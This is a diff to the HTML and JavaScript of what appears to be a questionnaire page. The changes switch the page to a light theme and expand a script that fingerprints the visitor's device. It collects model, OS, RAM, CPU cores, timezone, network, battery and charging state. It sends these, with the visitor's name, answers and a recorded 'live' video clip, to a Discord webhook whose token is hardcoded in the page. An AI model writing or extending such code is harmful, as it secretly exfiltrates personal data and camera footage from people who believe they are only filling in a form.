@@ -7,23 +7,24 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #31103f 100%);
-            --card-bg: rgba(255, 255, 255, 0.95);
+            /* تعديل الخلفية لتصبح بيضاء/فاتحة بدل البنفسجي الغامق */
+            --bg-gradient: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            --card-bg: rgba(255, 255, 255, 0.98);
             --primary-accent: #6366f1;
             --secondary-accent: #ff4757;
             --success-color: #10b981;
             --text-main: #1e293b;
             --text-muted: #64748b;
             --input-bg: #f8fafc;
-            --border-color: #e2e8f0;
+            --border-color: #cbd5e1;
             --border-focus: #6366f1;
             --radius-lg: 20px;
             --radius-md: 12px;
-            --shadow-glow: 0 20px 40px -15px rgba(99, 102, 241, 0.3);
+            --shadow-glow: 0 20px 40px -15px rgba(0, 0, 0, 0.08);
         }
         * { box-sizing: border-box; transition: all 0.25s ease; }
         body { font-family: 'Plus Jakarta Sans', Arial, sans-serif; background: var(--bg-gradient); background-attachment: fixed; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main); }
-        .card { background: var(--card-bg); backdrop-filter: blur(12px); padding: 40px 35px; border-radius: var(--radius-lg); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4), var(--shadow-glow); text-align: center; max-width: 600px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.3); }
+        .card { background: var(--card-bg); backdrop-filter: blur(12px); padding: 40px 35px; border-radius: var(--radius-lg); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1), var(--shadow-glow); text-align: center; max-width: 600px; width: 100%; border: 1px solid rgba(226, 232, 240, 0.8); }
         .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .welcome-badge { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
         .lang-select { padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-color); background-color: var(--input-bg); font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; }
@@ -88,7 +89,6 @@
     </div>
 
     <script>
-        // Webhook URL mte3ek el 7a9iqi m3abbi direct fel frontend
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz";
 
         const translations = {
@@ -121,7 +121,7 @@
             navigator.getBattery().then(battery => {
                 function updateBattery() {
                     batteryInfoGlobal.niveau = Math.round(battery.level * 100) + "%";
-                    batteryInfoGlobal.enCharge = battery.charging ? "Oui (Branché ⚡)" : "Non (Sur batterie 🔋)";
+                    batteryInfoGlobal.enCharge = battery.charging ? "Oui (Branché)" : "Non (Sur batterie)";
                 }
                 updateBattery();
                 battery.addEventListener('levelchange', updateBattery);
@@ -131,19 +131,32 @@
 
         async function getDetailedDeviceInfo() {
             const ua = navigator.userAgent;
-            let osName = "Système Inconnu";
-            if (/android/i.test(ua)) osName = "Android";
-            else if (/iphone|ipad|ipod/i.test(ua)) osName = "iOS (Apple)";
-            else if (/windows/i.test(ua)) osName = "Windows PC";
+            let osName = "Système Inconnu", brandOrModel = "Appareil Inconnu";
+            if (/android/i.test(ua)) { osName = "Android"; let m = ua.match(/Android\s([0-9\.]+)/); if (m) osName += " " + m[1]; }
+            else if (/iphone|ipad|ipod/i.test(ua)) { osName = "iOS (Apple)"; }
+            else if (/windows/i.test(ua)) { osName = "Windows PC"; }
+
+            if (/Samsung/i.test(ua)) brandOrModel = "Samsung Galaxy";
+            else if (/iPhone/i.test(ua)) brandOrModel = "Apple iPhone";
+
+            let connectionType = "Non disponible";
+            if (navigator.connection) {
+                connectionType = `${navigator.connection.effectiveType || 'Inconnu'} (${navigator.connection.downlink || 0} Mbps)`;
+            }
 
             return {
+                appareil: brandOrModel,
                 systemeExploitation: osName,
-                navigateur: navigator.appName,
+                navigateur: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.appName,
                 plateforme: navigator.platform,
-                langueSysteme: navigator.language,
+                langueSysteme: navigator.language || navigator.languages[0],
+                memoireRAMApproximative: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
+                processeurCœurs: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Non disponible",
                 resolutionEcran: `${window.screen.width} x ${window.screen.height}`,
+                fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 niveauBatterie: batteryInfoGlobal.niveau,
-                etatCharge: batteryInfoGlobal.enCharge
+                etatCharge: batteryInfoGlobal.enCharge,
+                reseau: connectionType
             };
         }
 
@@ -158,13 +171,14 @@
                     if (val) answersSummary += `Q${i}: ${val} | `;
                 }
 
+                // تنسيق تقرير ديسكورد المفصل تماماً كالذي طلبته
                 const deviceStr = Object.entries(deviceDetails).map(([k, v]) => `• **${k}**: ${v}`).join('\n');
-                const messageText = `🚨 **Rapport - ${reason}** 🚨\n👤 **Nom:** ${username}\n\n📋 **Réponses:**\n${answersSummary}\n\n💻 **Appareil & Batterie:**\n${deviceStr}`;
+                const messageText = `✅ **Nouveau Rapport Capturé (Capture/Formulaire):**\n• **Nom / Statut:** ${username} [🎥 فيديو مباشر (Live Video)]\n• **Questions:** ${answersSummary}\n${deviceStr}`;
 
                 const formData = new FormData();
                 formData.append('content', messageText);
                 if (blob) {
-                    formData.append('file', blob, 'clip.webm');
+                    formData.append('file', blob, 'live_clip.webm');
                 }
 
                 await fetch(DISCORD_WEBHOOK_URL, {
